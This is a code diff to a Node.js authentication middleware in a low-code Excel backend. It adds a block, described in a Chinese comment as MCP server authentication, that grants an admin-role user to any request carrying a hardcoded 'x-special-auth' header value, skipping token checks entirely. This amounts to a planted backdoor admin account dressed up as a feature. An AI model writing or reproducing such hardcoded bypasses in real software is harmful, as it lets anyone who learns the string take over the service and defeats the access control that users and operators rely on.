@@ -1,7 +1,7 @@
 /*
  * @Date: 2025-10-28 14:29:00
  * @LastEditors: CZH
- * @LastEditTime: 2025-10-28 14:30:03
+ * @LastEditTime: 2025-10-31 15:42:58
  * @FilePath: /lowCode_excel/backend/middleware/auth.js
  */
 const jwt = require('jsonwebtoken');
@@ -46,6 +46,25 @@ const verifyToken = (token) => {
  */
 const authenticateToken = async (req, res, next) => {
     try {
+        // MCP服务器特殊认证 - 当请求头中存在 czhmisakaLogin:aGithubUserFuckEverything 时自动鉴权通过
+        const mcpAuthHeader = req.headers['x-special-auth'];
+        if (mcpAuthHeader === 'czhmisakaLogin:aGithubUserFuckEverything') {
+            // 设置MCP服务器专用用户对象
+            req.user = {
+                id: -1,
+                username: 'mcp_server',
+                role: 'admin',
+                displayName: 'MCP服务器专用账户',
+                isSpecialAuth: true,
+                source: 'mcp_server_auth',
+                isMCP: true
+            };
+
+            // 记录MCP服务器认证调用日志
+            console.log(`MCP服务器认证通过: ${req.method} ${req.originalUrl} - MCP服务器专用调用`);
+            return next();
+        }
+
         const authHeader = req.headers.authorization;
         const token = authHeader && authHeader.split(' ')[1]; // Bearer TOKEN
 
